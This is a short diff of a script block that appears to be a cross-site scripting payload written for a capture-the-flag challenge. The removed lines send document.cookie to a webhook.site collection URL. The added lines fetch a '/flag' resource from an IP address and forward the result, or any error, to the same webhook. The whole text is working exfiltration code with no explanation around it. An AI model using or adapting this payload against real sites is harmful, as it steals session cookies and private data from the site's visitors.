@@ -1,8 +1,10 @@
 <script>
-fetch("http://95.182.100.126/index.html?x=" + encodeURIComponent(`
-    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d", {
-        method: "POST",
-        body: document.cookie
-    });
-`));
+fetch("http://95.182.100.126/flag")
+  .then(r => r.text())
+  .then(flag => {
+    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?flag=" + encodeURIComponent(flag));
+  })
+  .catch(err => {
+    fetch("https://webhook.site/8e33713a-acea-4b39-bfa9-cf8ffd7d7a1d?err=" + encodeURIComponent(err));
+  });
 </script>
